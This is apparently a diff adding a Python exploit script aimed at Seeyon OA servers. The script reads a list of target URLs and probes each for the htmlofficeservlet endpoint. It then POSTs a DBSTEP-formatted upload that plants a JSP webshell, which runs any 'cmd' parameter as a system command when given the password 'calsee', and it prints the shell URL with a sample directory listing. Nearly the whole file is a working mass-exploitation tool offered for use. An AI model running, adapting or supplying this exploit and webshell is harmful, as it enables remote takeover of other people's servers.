@@ -1,0 +1,96 @@
+#!/usr/bin/env python3
+# _*_ coding:utf-8 _*_
+# Author : Noth
+# Time : 2023-8-1
+
+import os
+import sys
+import re
+import requests
+from bs4 import BeautifulSoup
+
+requests.packages.urllib3.disable_warnings()
+
+path = 'seeyon/htmlofficeservlet'
+
+try:
+    with open('/home/kali/Desktop/PoC/致遠/target.txt','r') as file:
+        target_url = file.readlines()
+        sucess_list = []
+        for target_test in target_url:
+            target_list = target_test.strip()
+            # print(target_list)
+            TestPath = target_list + '/' + path
+            try:
+                response = requests.get(TestPath,timeout=20)
+                if response.status_code == 200 and 'DBSTEP' in response.text:
+                    print("訪問成功")
+                    print(f"路徑: {target_list}/{path}")
+                    sucess_list.append({target_list})
+                else:
+                    print(f"訪問失敗 {target_list}")
+            except requests.exceptions.RequestException as e:
+                print(f"出現異常跳過此URL: {target_list}")
+                continue
+except FileNotFoundError:
+        print('當前路徑找不到 target.txt')
+except IOError:
+    print('文件權限錯誤 , 無法讀取')
+    pass
+
+if sucess_list:
+    with open('/home/kali/Desktop/PoC/致遠/sucess.txt','w') as f:
+        for result in sucess_list:
+            f.write(result + '\n')
+
+try:
+    with open('/home/kali/Desktop/PoC/致遠/sucess.txt','r') as file:
+        sucess_test = file.readlines()
+        for sucess_url in sucess_test:
+            url_without_suffix = sucess_url.strip().replace('/seeyon/htmlofficeservlet', '').replace('https://','').replace('http://','')
+            print(url_without_suffix)     
+            
+            headers = { 
+            "Host": url_without_suffix,
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "close",
+                "Cookie": "JSESSIONID=14DFD8C8CA5E6DB12A17AA3F56356A83",
+                "Upgrade-Insecure-Requests": "1",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Originating-IP": "127.0.0.1",
+                "X-Remote-IP": "127.0.0.1",
+                "X-Remote-Addr": "127.0.0.1",
+                "Content-Length": "1116"
+            }
+
+            data = """
+            DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
+            OPTION=S3WYOSWLBSGr
+            currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+            CREATEDATE=wUghPB3szB3Xwg66
+            RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+            originalFileId=wV66
+            originalCreateDate=wUghPB3szB3Xwg66
+            FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+            needReadFile=yRWZdAS6
+            originalCreateDate=wLSGP4oEzLKAz4=iz=66
+            <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
+            """
+
+            try:
+                full_url = f"http://{url_without_suffix}"
+                response = requests.post(url=full_url, headers=headers, data=data,timeout=20)
+                response.raise_for_status()  # 如果響應狀態代碼不是 2xx，顯示報錯
+                print(f"已成功上傳 Webshell :")
+                print(f"http://{url_without_suffix}/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir")
+            except requests.exceptions.RequestException as e:
+                print(f"Error sending POST request: {e}")
+
+except FileNotFoundError:
+        print('當前路徑找不到 target.txt')
+except IOError:
+    print('文件權限錯誤 , 無法讀取')
+    pass
